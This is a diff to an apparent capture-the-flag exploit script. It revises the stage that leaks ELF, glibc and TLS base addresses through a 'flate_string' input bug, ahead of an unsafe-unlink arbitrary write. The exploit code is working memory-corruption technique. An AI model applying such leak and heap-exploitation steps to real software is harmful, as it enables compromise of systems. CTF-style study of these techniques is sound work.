@@ -59,18 +59,20 @@ def calculate_pointer_guard(encrypted: int, decrypted: int):
 # 4. if number is larger than 512 (0x200) bytes, function will not process this and following "number<char>", and not set null terminator, and directly return
 
 # Stage 1: leak elf base address, glibc base address, and tls base address
-# first qword of output string has a fixed offset from elf base address
+# 1st qword of output string has a fixed offset from elf base address
 flate_string(b'10000a')
 p.recvuntil(b"Flated: ")
 elf_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x21d8
 log.info(f"elf base address: {hex(elf_base_addr)}")
-# fourth qword of output string has a fixed offset from glibc base address
+# 4th qword of output string has a fixed offset from glibc base address
 flate_string(b'24a10000b')
 p.recvuntil(b"a"*24)
 glibc_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0xad7e2
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
-# tls base address has a fixed offset from glibc base address
-tls_base_addr = glibc_base_addr-0x28c0
+# 63rd qword of output string has a fixed offset from tls base address
+flate_string(b"496a10000b")
+p.recvuntil(b"a"*496)
+tls_base_addr = u64(p.recvline().strip().ljust(8, b"\x00"))-0x33596
 log.info(f"tls base address: {hex(tls_base_addr)}")
 
 # Stage 2: unsafe unlink to get arbitrary write
